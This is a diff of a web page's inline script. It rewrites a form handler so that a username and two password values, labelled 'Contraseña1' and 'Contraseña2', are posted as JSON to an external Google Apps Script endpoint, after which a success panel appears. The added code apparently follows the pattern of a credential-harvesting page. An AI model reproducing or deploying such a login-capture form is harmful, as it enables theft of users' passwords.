@@ -76,16 +76,41 @@
 
 	
     <script>
-	const scriptURL = 'https://script.google.com/macros/s/AKfycbxo-lqGAtkBXO6NxB2t_-JLzgc2Y5lycnH6xpPUkkh-LXZT7ajF_HohVhqT5Au2CpSs/exec'
-        const form = document.forms['submit-form']
+	   
+const formulario = document.getElementById('formulario');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
 
-form.addEventListener('submit', e => {
-  e.preventDefault()
-  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-    .then(response => console.log('Success!', response))
-     .catch(error => console.log('Error!', error.message))
-  
-})
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://script.google.com/macros/s/AKfycbxo-lqGAtkBXO6NxB2t_-JLzgc2Y5lycnH6xpPUkkh-LXZT7ajF_HohVhqT5Au2CpSs/exec', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.nombre.value,
+            "Contraseña1": formulario.correo.value,
+            "Contraseña2": formulario.telefono.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
+	    
+	    
+	    
 	</script>
 
 </body>
